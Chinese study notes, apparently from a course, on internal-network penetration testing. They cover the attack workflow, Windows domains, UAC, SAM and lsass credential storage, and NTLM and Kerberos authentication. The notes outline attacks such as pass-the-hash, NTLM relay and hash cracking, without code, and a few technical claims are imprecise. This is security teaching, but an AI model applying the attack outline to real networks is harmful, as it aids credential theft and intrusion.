第一章 内网基础知识

1.渗透的大致思路
信息收集->漏洞利用(主要是web漏洞)->权限提升->权限维持(反弹shell)->内网代理->内网渗透->痕迹清理(后渗透)

2.内网渗透的大致思路
内网信息收集(防火墙，IP段，端口，定位域控，域用户，杀软)->内网漏洞利用->[[横向移动(重要)]]->跨域攻击

3.什么是域(重要)
域可以说是升级版的工作组，由于工作组很灵活，不方便管理，没有[[统一的管理]]的管理，因此诞生了[[域]]，域可以理解为统一管理的一片主机区域，其中[[域控]]是域的最高管理员，只要是该域内的成员，无论做什么事情(加入域，退出域，以及下载软件)都要经过域控的批准(即域控的账号和密码)，才可以进行操作。域控可以分配域成员的身份和权限。每个域都有一个域名，一个域可以派生多个子域。

5.UAC认证是什么

UAC(User Account Control 用户账户控制)，主要功能是 在进行一些会影响系统安全的[[高权限]]操作时，会自动触发UAC(即许可提示窗口)来提醒用户，用户确认后才能执行操作。

UAC的触发条件:
1.修改Windows Update配置；
2.增加或删除用户帐户；
3.改变用户的帐户类型；
4.改变UAC设置；
5.安装ActiveX;；
6.安装或卸载程序；
7.安装设备驱动程序；
8.修改和设置家长控制；
9.增加或修改注册表；
10.将文件移动或复制到Program Files 或 Windows目录下；
11.访问其他用户目录

UAC的四种设置：
1.始终通知；
2.仅在程序尝试对我的计算机进行更改时通知我；
3.仅当程序尝试对我的计算机进行更改时通知我(不降低桌面亮度)；
4.从不通知 就算设置不弹框，认证还是在，对于普通管理员只是省略了点击是的按钮；对于普通用户，还是会弹窗并且要输入超管的密码。

Windows计算机可 Win+R 输入 msconfig 来设置UAC6.本地系统最高权限(system)

二.域内机器权限
注意：机器加入到域之后可以选择使用域内用户登录，也可以使用本地用户登录，注意以下的区别
1）本地用户登录，用户信息是存放在本地文件中然后本机进行校验；域内用户登录，用户信息是通过DC域控的校验认证后才能登录，用户信息存放在域控上。
2）本地用户登录主要对比的是NTLM HASH值，域认证是通过kerberos认证。
3）机器可以选择本地登录或者域用户登录，本地用户登录：机器名\用户名 密码；域用户登录 域名\用户名 密码。

第三章Windows认证机制和协议(重要)

本地认证

(1)本地认证概述

电脑开机(winlogon.exe)–(账号密码)–>Lsass.exe进程–和SAM文件中的密码对比–>SAM文件

Windows Logon Process (即winlogon.exe)是Windows NT 用户登录程序，用于管理用户登录和退出，且以system权限运行。用户注销、重启、锁屏后，操作系统会让winlogon.exe执行从而显示登陆界面。

lsass.exe是一个系统进程，用于微软Windows系统的安全机制，进行本地安全和登录策略，即我们输入帐户密码后就会执行这个进程到SAM文件进行我们密码的认证。SAM文件是位于C:\Windows\System32\config\目录下，用于存储本地所有用户的凭证信息，但这并不代表你可以随时随意去查看系统密码。

(2)SAM文件和lsass进程

SAM文件是Windows的用户帐户数据库，所有用户的登录名以及口令等相关信息都会保存在这个文件中，简单格式如下：
[[用户名称:LM-HASH值(用户明文密码经过LM-HASH加密后的值):NTLM-HASH值]]
如：administrator:BBBBD587519FE693CD83CABBA4F3AB17:77269418bfae986e554cff5de4fd59fe
SAM文件中的密码并不是以明文的形式存在，而是加密存储在SAM文件中

Lsass.exe进程的作用非常重要，其主要负责管理[[本地安全策略和认证机制]]。这些策略包括密码策略、账户策略、用户权限、域策略等等。同时还负责对用户进行身份验证，以确保只有授权的用户才能访问系统资源。
重要作用
1.将winlogon进程传过来的[[明文账号密码进行加密]]，然后和SAM文件中的[[密文账号密码做对比]]，如果对比成功就可以实现登录。
2.将收到的明文账号密码在本地内存中保留一份做备用。

网络认证

1.网络认证概述和介绍

碰到工作组的计算机，主机A想访问主机B上的资源，就要向主机B发送一个存在于主机B的一个帐户，主机B接收以后会在本地进行验证，如果验证成功，才会允许主机A进行相应的访问。

1.用户名和密码认证：这是最常见的认证方式，用户需要提供有效的用户名和密码，从而认证其身份。这种认证方式适用于本地计算机账户或域账户。

2.Kerberos认证(重点)：Kerberos是一种网络身份验证协议，在Windows域环境中广泛使用。它通过使用票据和票据授权票证(TGT)来验证用户身份，并生成会话密钥用于加密通信。

3.NTLM认证(重点)：NTLM(NT LAN Manager)是一种早期的Windows网络认证协议，它使用基于挑战-响应的方式进行身份验证。尽管Kerberos已经成为首选的认证协议，但NTLM仍然在某些情况下使用，特别是在与旧版Windows系统或非Windows系统进行交互操作时用到。

4.密钥身份认证：Windows还支持使用密钥来进行身份认证。这种方式涉及使用预先共享的密钥来对用户进行身份验证，通常用于特定的场景和应用。

5.远程桌面认证(Remote Desktop Authentication)：远程桌面是一种远程访问Windows计算机的功能。在远程桌面连接时，用户需要提供目标计算机的凭据进行认证，以验证身份并获得远程访问权限。

6.NTLM协议安全问题

A主机与B服务器进行NTLM认证，如果此时C主机抓取到了A与B之间认证的数据包，或者C伪造A发送认证数据包，此时B也会将C看成是自己的“朋友”，所以NTLM认证是存在安全问题的，最终的身份还是无法确定是否是“自己人”。

1.PTH攻击(Hash传递)：因为NTLM协议认证过程中使用到用户的NTLM-hash值的计算，如果我们知道对方电脑的Hash值就可以进行PTH攻击
2.NET-NTLM hash relay攻击：NTLM中间人攻击，如果获得NET-NTLM v1 Hash，可以重放其hash值进行认证
3.NET-NTLM v1 v2 Hash破解：v1比较简单，容易破解使用DES，如果是v2就要使用md5碰撞的方式可以使用彩虹表或者暴力破解等方式，获取明文的账号密码

域Kerberos认证

1.Kerberos协议简介

Kerberos也是一种[[网络认证协议]]，其设计目标是通过密钥系统为 客户机/服务器 应用程序提供强大的认证服务。该认证过程的实现[[不依赖于主机操作系统的认证]]，无需基于主机地址的信任，不要求网络上所有主机的物理安全，并假定网络上传送的数据包可以被任意地读取、修改和插入数据。在以上情况下，Kerberos作为一种可信赖的第三方认证服务，是通过传统的密码技术(如：共享密钥)执行认证服务。

简单来讲，Kerberos协议认证就是一个第三方认证机构，客户机/服务器 双方并不需要去建立信任关系，他们之间是否信任直接去问这个第三方认证机构(Kerberos)就可以了。
